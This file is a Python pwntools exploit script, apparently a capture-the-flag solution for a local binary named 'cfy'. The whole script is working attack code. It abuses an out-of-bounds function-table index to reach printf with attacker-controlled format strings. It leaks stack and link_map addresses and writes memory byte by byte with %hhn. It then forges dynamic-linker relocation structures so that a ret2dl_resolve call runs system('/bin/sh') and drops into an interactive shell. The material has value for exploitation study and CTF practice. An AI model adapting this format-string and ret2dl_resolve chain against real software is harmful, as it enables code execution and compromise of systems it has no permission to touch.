#!/usr/bin/env python
from pwn import *

def select(num, data):
    s.sendlineafter('quit\n', str(num))
    s.sendlineafter('number: ', data)

def execute(addr, arg):
    choice = (elf.symbols['buf'] - elf.symbols['parsers'] + 0x50) >> 4
    select(str(choice), arg.ljust(0x50, '\0') + p64(addr))

def overwrite(addr, data):
    for i in range(len(data)):
        select(1, str(addr + i))
        execute(elf.symbols['printf'], '%{}x%7$hhn'.format(ord(data[i]) + 0x100))

if __name__ == '__main__':
    s = process('./cfy')

    elf = ELF('./cfy')

    pop_rdi = 0x400993
    dl_runtime_resolve = 0x4005c0

    buf_addr = 0x6010e0
    rel_base = 0x4004d8
    sym_base = 0x4002c0
    str_base = 0x4003c8

    execute(elf.symbols['printf'], '%11$p/')
    stack_addr = int(s.recvuntil('/')[:-1], 16) - 0xe0
    log.info('stack address: %#x' % stack_addr)

    select(1, str(0x601008))
    execute(elf.symbols['printf'], '%7$s/')
    link_map = u64(s.recvuntil('/')[:-1].ljust(8, '\0'))
    log.info('link map address: %#x' % link_map)

    overwrite(link_map + 0x1c8, p64(0))

    payload = ''
    payload += p64(pop_rdi) + p64(buf_addr + 0x200)
    payload += p64(dl_runtime_resolve)
    payload += p64((buf_addr + 0x110 - rel_base) // 0x18)
    overwrite(stack_addr, payload)

    payload = ''
    payload += '\0' * 0x110
    payload += p64(buf_addr)
    payload += p32(7) + p32((buf_addr + 0x150 - sym_base) // 0x18)
    payload = payload.ljust(0x150, '\0')
    payload += p32(buf_addr + 0x180 - str_base) + p32(0x12)
    payload = payload.ljust(0x180, '\0')
    payload += 'system\0'
    payload = payload.ljust(0x200, '\0')
    payload += '/bin/sh\0'
    select(0, payload)
    s.sendlineafter('quit\n', '3')
    s.recvline()
    s.interactive()
